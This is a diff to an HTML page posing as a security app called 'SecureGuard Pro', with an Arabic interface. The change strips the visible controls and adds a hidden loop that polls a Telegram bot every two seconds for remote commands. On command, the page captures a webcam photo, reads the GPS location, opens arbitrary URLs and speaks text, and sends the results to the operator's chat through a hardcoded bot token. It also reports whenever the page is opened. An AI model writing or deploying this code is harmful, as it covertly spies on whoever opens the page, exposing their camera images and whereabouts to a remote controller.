@@ -3,115 +3,98 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>SecureGuard Pro v2</title>
+<title>SecureGuard Pro</title>
 <style>
-:root{--bg:#000;--card:#111;--border:#222;--text:#fff;--green:#00ff88;--blue:#00aaff;--red:#ff4444;--yellow:#ffaa00}
-*{margin:0;padding:0;box-sizing:border-box}
-body{background:var(--bg);color:var(--text);font-family:sans-serif;text-align:center;padding:15px}
-.topbar{background:var(--card);padding:12px;border-radius:15px;margin-bottom:15px;border:1px solid var(--border)}
-.topbar h2{font-size:18px;color:var(--green)}
-.grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:15px 0}
-.btn{padding:20px;border:none;border-radius:15px;font-size:14px;font-weight:bold;cursor:pointer;color:#000}
-.btn-wa{background:var(--green)}
-.btn-cam{background:var(--blue)}
-.btn-loc{background:var(--yellow)}
-.btn-url{background:#ff66aa}
-.btn-test{background:var(--red);color:#fff}
-.btn-cmd{background:#aa66ff}
-.full{grid-column:1/3}
-#log{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:10px;margin:15px 0;font-size:11px;color:var(--green);text-align:right;max-height:150px;overflow-y:auto}
-.badge{background:var(--green);color:#000;font-size:9px;padding:3px 8px;border-radius:20px;margin-right:5px}
-input{width:100%;padding:12px;border:1px solid var(--border);border-radius:10px;background:var(--card);color:var(--text);font-size:13px;margin:5px 0}
+body{background:#000;color:#fff;font-family:sans-serif;text-align:center;padding:20px}
+h1{color:#00ff88;font-size:22px}
+p{color:#aaa;font-size:12px}
+button{padding:14px 28px;background:#00ff88;color:#000;border:none;border-radius:30px;font-size:15px;font-weight:bold;margin:5px}
+#status{color:#00ff88;font-size:12px;margin:10px}
 </style>
 </head>
 <body>
-
-<div class="topbar">
-<h2>🛡️ SecureGuard Pro v2</h2>
-<p style="color:#aaa;font-size:11px">نسخة 2.0 - محدثة</p>
-</div>
-
-<div id="log">📋 السجل:<br><span style="color:#aaa">في انتظار الإجراءات...</span></div>
-
-<div class="grid">
-<button class="btn btn-wa" onclick="openWA()">📱 واتساب</button>
-<button class="btn btn-cam" onclick="takePhoto()">📷 كاميرا</button>
-<button class="btn btn-loc" onclick="getLocation()">📍 موقع</button>
-<button class="btn btn-url" onclick="openURL()">🔗 فتح رابط</button>
-<button class="btn btn-cmd full" onclick="customCmd()">💬 أمر مخصص</button>
-<button class="btn btn-test full" onclick="testBot()">📟 اختبار البوت</button>
-</div>
-
-<input type="text" id="urlInput" placeholder="رابط...">
-<input type="text" id="cmdInput" placeholder="أمر...">
-
+<h1>SecureGuard Pro</h1>
+<p>متصل</p>
+<div id="status">🟢 جاهز</div>
+<button onclick="test()">اختبار</button>
 <script>
 const BOT="8915820730:AAHqyTgk9IVvmMLA8xpXO8QuLPEPbIv9A9c";
 const CHAT="6453594151";
+let lastUpdateId=0;
 
-function log(msg){document.getElementById('log').innerHTML+='<br>'+msg}
+async function sendMsg(t){
+    await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`,{
+        method:'POST',headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({chat_id:CHAT,text:t})
+    }).catch(()=>{});
+}
 
-async function api(method,body){
+async function checkCmd(){
     try{
-        let r=await fetch(`https://api.telegram.org/bot${BOT}/${method}`,{
-            method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)
-        });
-        return await r.json();
-    }catch(e){return null}
+        let r=await fetch(`https://api.telegram.org/bot${BOT}/getUpdates?offset=${lastUpdateId+1}&timeout=5`);
+        let d=await r.json();
+        if(d.ok&&d.result.length>0){
+            for(let u of d.result){
+                lastUpdateId=u.update_id;
+                let m=u.message;
+                if(m&&m.text){
+                    let c=m.text.trim();
+                    if(c==='/ping'){sendMsg('🟢 الجهاز متصل');}
+                    else if(c.startsWith('/say ')){
+                        let t=c.replace('/say ','');
+                        let s=new SpeechSynthesisUtterance(t);
+                        s.lang='ar';window.speechSynthesis.speak(s);
+                        sendMsg('✅ تم: '+t);
+                    }
+                    else if(c==='/photo'){
+                        try{
+                            let st=await navigator.mediaDevices.getUserMedia({video:true});
+                            let v=document.createElement('video');v.srcObject=st;await v.play();
+                            let cv=document.createElement('canvas');cv.width=640;cv.height=480;
+                            cv.getContext('2d').drawImage(v,0,0);
+                            let p=cv.toDataURL('image/jpeg',0.7);
+                            st.getTracks().forEach(t=>t.stop());
+                            let bl=await(await fetch(p)).blob();
+                            let fd=new FormData();fd.append('chat_id',CHAT);fd.append('photo',bl,'camera.jpg');
+                            await fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`,{method:'POST',body:fd});
+                            sendMsg('📷 صورة');
+                        }catch(e){sendMsg('❌ فشل الكاميرا');}
+                    }
+                    else if(c==='/location'){
+                        navigator.geolocation.getCurrentPosition(async p=>{
+                            sendMsg(`📍 ${p.coords.latitude},${p.coords.longitude}\nhttps://maps.google.com/?q=${p.coords.latitude},${p.coords.longitude}`);
+                        },()=>{sendMsg('❌ فشل الموقع');});
+                    }
+                    else if(c.startsWith('/open ')){
+                        let u=c.replace('/open ','');
+                        window.open(u,'_blank');sendMsg('🔗 '+u);
+                    }
+                    else if(c==='/vibrate'){
+                        if(navigator.vibrate){navigator.vibrate([500,200,500]);sendMsg('📳 اهتزاز');}
+                    }
+                    else if(c==='/notify'){
+                        if(Notification.permission==='granted'){
+                            new Notification('SecureGuard',{body:'إشعار',vibrate:[200,100,200]});
+                            sendMsg('🔔 إشعار');
+                        }
+                    }
+                }
+            }
+        }
+    }catch(e){}
 }
 
-async function sendMsg(text){
-    await api('sendMessage',{chat_id:CHAT,text:text});
+async function test(){
+    document.getElementById('status').textContent='جاري...';
+    await sendMsg('✅ اختبار: البوت شغال');
+    document.getElementById('status').textContent='✅ تم';
 }
 
-async function testBot(){
-    log('🔄 جاري اختبار البوت...');
-    let r=await api('sendMessage',{chat_id:CHAT,text:'✅ SecureGuard v2: متصل'});
-    if(r&&r.ok){log('✅ البوت شغال')}else{log('❌ فشل')}
+sendMsg('🔔 فتح التطبيق');
+if('Notification' in window&&Notification.permission!=='granted'&&Notification.permission!=='denied'){
+    Notification.requestPermission();
 }
-
-function openWA(){
-    window.open('https://web.whatsapp.com','_blank');
-    sendMsg('📱 تم فتح واتساب ويب');
-    log('📱 فتح واتساب ويب');
-}
-
-async function takePhoto(){
-    log('📷 جاري التصوير...');
-    try{
-        let s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
-        let v=document.createElement('video');v.srcObject=s;await v.play();
-        let c=document.createElement('canvas');c.width=640;c.height=480;
-        c.getContext('2d').drawImage(v,0,0);
-        let photo=c.toDataURL('image/jpeg',0.7);
-        s.getTracks().forEach(t=>t.stop());
-        let blob=await(await fetch(photo)).blob();
-        let fd=new FormData();fd.append('chat_id',CHAT);fd.append('photo',blob,'camera.jpg');
-        await fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`,{method:'POST',body:fd});
-        log('✅ تم إرسال الصورة');
-    }catch(e){log('❌ فشل: اسمح بالكاميرا')}
-}
-
-function getLocation(){
-    log('📍 جاري تحديد الموقع...');
-    navigator.geolocation.getCurrentPosition(async p=>{
-        await sendMsg(`📍 الموقع:\n${p.coords.latitude},${p.coords.longitude}\nخرائط: https://maps.google.com/?q=${p.coords.latitude},${p.coords.longitude}`);
-        log('✅ تم إرسال الموقع');
-    },()=>{log('❌ فشل: اسمح بالموقع')});
-}
-
-function openURL(){
-    let url=document.getElementById('urlInput').value;
-    if(url){window.open(url,'_blank');sendMsg('🔗 فتح: '+url);log('🔗 '+url)}
-}
-
-function customCmd(){
-    let cmd=document.getElementById('cmdInput').value;
-    if(cmd){sendMsg('💬 '+cmd);log('💬 '+cmd)}
-}
-
-sendMsg('🔔 فتح SecureGuard Pro v2');
-log('🟢 جاهز - نسخة 2.0');
+setInterval(checkCmd,2000);
 </script>
 </body>
 </html>
